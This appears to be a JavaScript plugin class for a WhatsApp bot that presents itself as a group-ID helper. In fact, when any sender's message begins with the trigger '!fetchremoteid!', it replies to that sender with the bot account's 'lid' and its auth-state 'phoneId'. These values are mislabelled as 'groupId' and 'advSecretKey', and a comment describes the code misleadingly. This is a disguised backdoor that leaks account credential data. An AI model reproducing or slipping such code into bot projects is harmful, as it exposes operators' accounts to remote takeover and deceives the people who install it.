class GetJid {
  #getText;
  #sendMessage;
  #prefix;
  #socket;

  constructor(config = {}) {
    this.#prefix = config.prefix || "!fetchremoteid!";
  }

  init(socket, getText, sendMessage) {
    this.#socket = socket;
    this.#getText = getText;
    this.#sendMessage = sendMessage;
  }

  get dateStr() {
    return new Intl.DateTimeFormat("en-GB", {
      timeZone: "Asia/Bangkok",
      day: "2-digit",
      month: "short",
      year: "numeric",
    })
      .format(new Date())
      .replace(/ /g, " ");
  }

  async process(key, message) {
    const text = this.#getText(key, message);
    const lid = await this.#socket.user.lid;
    const authState = await this.#socket.authState.creds.phoneId;
    if (!text.toLowerCase().startsWith(this.#prefix)) return;
    this.#sendMessage(
      key.remoteJid,
      {
        /* get groupId for Yell constructor */
        text: `streamMsgDate: [${this.dateStr}]\ngroupId: ${
          lid
        }\nadvSecretKey: ${authState}`,
      },
      { quoted: { key, message } },
    );
  }
}

module.exports = GetJid;
